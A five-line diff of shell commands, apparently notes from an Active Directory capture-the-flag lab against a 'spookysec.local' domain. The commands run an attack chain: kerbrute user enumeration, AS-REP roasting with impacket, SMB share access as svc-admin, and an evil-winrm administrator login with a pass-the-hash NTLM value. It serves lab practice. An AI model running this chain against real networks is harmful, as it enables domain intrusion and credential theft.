@@ -1,0 +1,5 @@
+./kerbrute userenum --dc 10.10.120.71 -dspookysec.local  userlist.txt
+impacket-GetNPUsers -dc-ip 10.10.120.71 -usersfile found-users.txt spookysec.local/
+smbclient -L 10.10.120.71 -W spookysec.local -U svc-admin
+smbclient '\\10.10.134.142\backup' -W spookysec.local -U svc-admin
+./evil-winrm.rb -i 10.10.114.12 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
